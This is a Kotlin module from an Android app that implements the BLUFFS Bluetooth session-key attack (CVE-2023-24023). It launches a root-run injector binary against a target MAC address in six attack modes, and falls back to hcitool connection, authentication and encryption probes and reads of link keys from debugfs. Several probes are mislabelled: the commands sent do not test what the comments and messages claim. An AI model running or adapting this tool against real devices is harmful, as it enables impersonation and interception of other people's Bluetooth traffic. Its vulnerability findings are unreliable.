package com.hereliesaz.blusnu.data

import android.util.Log
import com.hereliesaz.blusnu.utils.MacValidator
import com.hereliesaz.blusnu.utils.RootExecutor
import kotlinx.coroutines.flow.Flow
import kotlinx.coroutines.flow.flow

/**
 * Modes of operation for the BLUFFS attack (CVE-2023-24023).
 *
 * Based on the six attacks described in Antonioli, "BLUFFS: Bluetooth Forward
 * and Future Secrecy Attacks and Defenses" (USENIX Security 2023). Each mode
 * targets a different weakness in the BR/EDR session key derivation process.
 */
enum class BluffsMode(val description: String) {
    A1("Unilateral impersonation via weak session key derivation"),
    A2("Bilateral MitM forcing both parties to derive a weak session key"),
    A3("LSC downgrade combined with session key impersonation"),
    A4("LSC downgrade combined with session key MitM"),
    A5("Forward secrecy violation via session key nonce reuse"),
    A6("Future secrecy violation via cross-session key reuse")
}

/**
 * Implementation of the BLUFFS (Bluetooth Forward and Future Secrecy) attack.
 *
 * This module targets the session key derivation mechanism in Bluetooth Classic
 * (BR/EDR). BLUFFS exploits the lack of mutual nonce freshness guarantees in
 * the BR/EDR session establishment procedure, allowing an attacker to force
 * weak session key derivation, impersonate devices, or perform MitM attacks.
 *
 * The module first checks for a dedicated native binary (`bluffs_injector`).
 * If that binary is not present, it falls back to hcitool to create an ACL
 * connection and probe session key properties. The hcitool fallback creates
 * an encrypted link and then reads the negotiated encryption key size from
 * the kernel debug filesystem.
 *
 * Root is required for all approaches (LMP manipulation, hcitool access).
 * All privileged operations are executed through [RootExecutor].
 */
class BluffsModule {

    companion object {
        private const val TAG = "BluffsModule"
        private const val BLUFFS_BINARY_PATH = "/data/local/tmp/bluffs_injector"

        /**
         * Minimum encryption key size mandated by the Bluetooth SIG after the
         * KNOB disclosure (CVE-2019-9506). Keys shorter than this bypass the
         * specification minimum and indicate a successful key-size downgrade.
         *
         * Source: Antonioli et al., "The KNOB is Broken" (USENIX Security 2019).
         */
        private const val KNOB_MINIMUM_KEY_BYTES = 7
    }

    /**
     * Checks if the device has root access via [RootExecutor].
     *
     * @return true if a root shell reports uid=0.
     */
    suspend fun checkRoot(): Boolean {
        return RootExecutor.isRootAvailable()
    }

    /**
     * Executes the BLUFFS attack workflow against the target device.
     *
     * The flow:
     * 1. Verify root access (required, no simulation fallback)
     * 2. Check if the native bluffs_injector binary exists
     * 3. If it exists, run it with the specified mode
     * 4. Otherwise, use hcitool to create an ACL connection and probe session key
     *
     * @param targetDevice The Bluetooth device to attack.
     * @param mode The specific BLUFFS variation to use.
     * @return A Flow of status strings for the UI console.
     */
    fun startAttack(targetDevice: TargetDevice, mode: BluffsMode): Flow<String> = flow {
        val mac = MacValidator.requireValid(targetDevice.macAddress)
        emit("Starting BLUFFS attack (CVE-2023-24023) on ${targetDevice.name ?: mac} using mode $mode")

        // Root is strictly required -- no simulation fallback
        if (!checkRoot()) {
            emit("ERROR: Root access is not available.")
            emit("BLUFFS requires root for LMP manipulation or hcitool access. Aborting.")
            return@flow
        }
        emit("Root access confirmed.")

        // Check if the dedicated native binary exists
        val binaryCheck = RootExecutor.execute("ls $BLUFFS_BINARY_PATH")
        val binaryExists = !binaryCheck.startsWith("Error") &&
                !binaryCheck.contains("No such file") &&
                binaryCheck.trim().isNotEmpty()

        if (binaryExists) {
            // Use the native bluffs_injector binary
            emit("Native bluffs_injector binary found at $BLUFFS_BINARY_PATH")
            emit("Executing: $BLUFFS_BINARY_PATH -t $mac -m ${mode.name}")

            val output = RootExecutor.execute("$BLUFFS_BINARY_PATH -t $mac -m ${mode.name}")
            // Emit each line of output from the binary
            for (line in output.lines()) {
                if (line.isNotBlank()) {
                    emit(line)
                }
            }

            if (output.startsWith("Error")) {
                emit("bluffs_injector execution failed.")
            } else {
                emit("bluffs_injector execution completed.")
            }
        } else {
            // Fallback: use hcitool to probe the connection
            emit("Native binary not found at $BLUFFS_BINARY_PATH")
            emit("Falling back to hcitool-based session key probing...")

            executeHcitoolApproach(mac, mode)
        }
    }

    /**
     * Uses hcitool to create an ACL connection, attempt authentication and
     * encryption, and then read the negotiated key size from the kernel debug
     * filesystem. The [mode] determines which additional probes are run after
     * the baseline connection is established.
     *
     * Key changes from the original implementation:
     *   - Removed nonexistent `hcitool key_size`; reads from debugfs instead.
     *   - Probes session key properties (not just KNOB key length).
     *   - Branches on [mode] for mode-specific probing.
     *   - Uses correct `hcitool enc <bdaddr>` syntax (no trailing keyword).
     *   - Correct threshold with separate tiers (< 7 = KNOB-vulnerable,
     *     7-15 = reduced, 16 = full).
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeHcitoolApproach(
        mac: String,
        mode: BluffsMode
    ) {
        // Step 1: Create ACL connection
        emit("Creating ACL connection to $mac...")
        val ccResult = RootExecutor.execute("hcitool cc $mac")
        if (ccResult.startsWith("Error")) {
            emit("Failed to create ACL connection: $ccResult")
            emit("The target may be out of range, unpaired, or not accepting connections.")
            return
        }
        emit("ACL connection result: ${ccResult.ifBlank { "OK (no output = success)" }}")

        // Step 2: Attempt authentication
        emit("Requesting authentication with $mac...")
        val authResult = RootExecutor.execute("hcitool auth $mac")
        if (authResult.startsWith("Error")) {
            emit("Authentication failed: $authResult")
            emit("Continuing to check encryption regardless...")
        } else {
            emit("Authentication result: ${authResult.ifBlank { "OK" }}")
        }

        // Step 3: Enable encryption -- correct BlueZ syntax: `hcitool enc <bdaddr>`
        emit("Enabling encryption on link to $mac...")
        val encResult = RootExecutor.execute("hcitool enc $mac")
        if (encResult.startsWith("Error")) {
            emit("Encryption setup failed: $encResult")
            emit("Cannot determine session key properties without encryption. Aborting.")
            return
        }
        emit("Encryption result: ${encResult.ifBlank { "OK" }}")

        // Step 4: Read key size from kernel debugfs (replaces nonexistent hcitool key_size)
        emit("Reading negotiated encryption key size from kernel debug filesystem...")
        val keySizeResult = RootExecutor.execute(
            "cat /sys/kernel/debug/bluetooth/hci0/encryption_key_size 2>/dev/null || " +
            "cat /sys/kernel/debug/bluetooth/hci0/link_key_size 2>/dev/null"
        )

        if (keySizeResult.startsWith("Error") || keySizeResult.isBlank()) {
            emit("Key size check unavailable -- requires kernel debug access (debugfs).")
            emit("Ensure debugfs is mounted: mount -t debugfs none /sys/kernel/debug")
            emit("Encryption is active but key size cannot be verified from this device.")
        } else {
            // Parse the key size from the output
            val keySizeMatch = Regex("(\\d+)").find(keySizeResult)
            val keySize = keySizeMatch?.groupValues?.get(1)?.toIntOrNull()

            if (keySize != null) {
                emit("Negotiated key size: $keySize bytes")
                evaluateKeySize(keySize, mode, mac)
            } else {
                emit("Could not parse key size from output. Raw output: $keySizeResult")
            }
        }

        // Step 5: Mode-specific session key probes
        executeModeSpecificProbe(mac, mode)
    }

    /**
     * Evaluates the negotiated key size against known vulnerability thresholds
     * and emits appropriate findings.
     *
     * Threshold tiers:
     *   < 7  bytes: KNOB-vulnerable -- below Bluetooth SIG mandated minimum
     *   == 7 bytes: At spec minimum -- not a KNOB bypass but still reduced security
     *   8-15 bytes: Adequate -- above minimum but below maximum
     *   == 16 bytes: Full encryption key size
     *
     * Source: Antonioli et al., "The KNOB is Broken" (USENIX Security 2019);
     * Bluetooth SIG Erratum 11838 (mandates minimum 7-byte key).
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.evaluateKeySize(
        keySize: Int,
        mode: BluffsMode,
        mac: String
    ) {
        when {
            keySize < KNOB_MINIMUM_KEY_BYTES -> {
                emit("VULNERABILITY CONFIRMED: Key size $keySize bytes is below the " +
                        "Bluetooth SIG minimum of $KNOB_MINIMUM_KEY_BYTES bytes.")
                emit("The target accepted a key shorter than the post-KNOB specification " +
                        "minimum. This indicates a successful key-size downgrade (KNOB, " +
                        "CVE-2019-9506).")
                emit("BLUFFS attack (mode ${mode.name}) -- session key entropy is critically weak.")
                Log.w(TAG, "KNOB vulnerability confirmed on $mac: key size $keySize bytes")
            }
            keySize == KNOB_MINIMUM_KEY_BYTES -> {
                emit("Key size is exactly $keySize bytes (the specification minimum).")
                emit("Not a KNOB bypass, but operating at the lowest allowed entropy.")
                emit("BLUFFS session key derivation may still be exploitable depending on " +
                        "nonce freshness enforcement.")
            }
            keySize < 16 -> {
                emit("Key size $keySize bytes is above the minimum but below the maximum of 16.")
                emit("Reduced security margin. BLUFFS session-level attacks depend on " +
                        "nonce handling, not key length alone.")
            }
            else -> {
                emit("Key size $keySize bytes. Full encryption key size negotiated.")
                emit("BLUFFS attack (mode ${mode.name}) did not achieve key-size reduction. " +
                        "Session key derivation weakness must be tested at the LMP layer.")
            }
        }
    }

    /**
     * Runs mode-specific probes after the baseline encrypted connection is
     * established. Each [BluffsMode] tests a different aspect of session key
     * derivation, matching the six attacks in the BLUFFS paper.
     */
    private suspend fun kotlinx.coroutines.flow.FlowCollector<String>.executeModeSpecificProbe(
        mac: String,
        mode: BluffsMode
    ) {
        emit("--- Mode-specific probe: ${mode.name} ---")

        when (mode) {
            BluffsMode.A1 -> {
                // Unilateral impersonation: check if Secure Connections is enforced
                emit("Probing Secure Connections enforcement...")
                val scResult = RootExecutor.execute("hcitool cmd 0x04 0x000C")
                emit("Read Local Supported Features result: ${scResult.ifBlank { "(empty)" }}")
                emit("A1: Check whether SC (Secure Connections) bit is set in remote features. " +
                        "If SC is not enforced, the session key can be derived unilaterally.")
            }
            BluffsMode.A2 -> {
                // Bilateral MitM: probe authentication requirements
                emit("Probing mutual authentication requirements...")
                val authResult = RootExecutor.execute("hcitool cmd 0x04 0x0028")
                emit("Read Remote Extended Features result: ${authResult.ifBlank { "(empty)" }}")
                emit("A2: If mutual authentication is not enforced, both session " +
                        "endpoints can be manipulated for MitM.")
            }
            BluffsMode.A3 -> {
                // LSC downgrade + impersonation: try to force legacy pairing
                emit("Probing LSC downgrade susceptibility...")
                val pairingResult = RootExecutor.execute("hcitool cmd 0x01 0x0019 $mac")
                emit("Remote Name Request result: ${pairingResult.ifBlank { "(empty)" }}")
                emit("A3: If the target accepts LSC (Legacy Secure Connections) " +
                        "when SC is available, session key impersonation is possible.")
            }
            BluffsMode.A4 -> {
                // LSC downgrade + MitM: combine A2 and A3
                emit("Probing combined LSC downgrade + MitM susceptibility...")
                val infoResult = RootExecutor.execute("hcitool info $mac")
                for (line in infoResult.lines()) {
                    if (line.isNotBlank()) emit(line)
                }
                emit("A4: Combined LSC downgrade with bilateral MitM. Both remote " +
                        "features and pairing mode must be analyzed.")
            }
            BluffsMode.A5 -> {
                // Forward secrecy: check nonce freshness
                emit("Probing session nonce freshness (forward secrecy)...")
                val connResult = RootExecutor.execute("hcitool con")
                emit("Active connections: ${connResult.ifBlank { "(none)" }}")
                emit("A5: Forward secrecy requires fresh nonces per session. " +
                        "If the controller reuses nonces, past sessions can be decrypted.")
            }
            BluffsMode.A6 -> {
                // Future secrecy: check cross-session key derivation
                emit("Probing cross-session key reuse (future secrecy)...")
                val keyResult = RootExecutor.execute(
                    "cat /sys/kernel/debug/bluetooth/hci0/link_keys 2>/dev/null"
                )
                if (keyResult.startsWith("Error") || keyResult.isBlank()) {
                    emit("Link key debug info unavailable. Requires debugfs access.")
                } else {
                    emit("Link keys found in debugfs. Analyzing for cross-session reuse...")
                    val keyCount = keyResult.lines().count { it.isNotBlank() }
                    emit("$keyCount link key entries found.")
                }
                emit("A6: Future secrecy is broken if the same session key material " +
                        "is derived across multiple sessions.")
            }
        }
    }
}
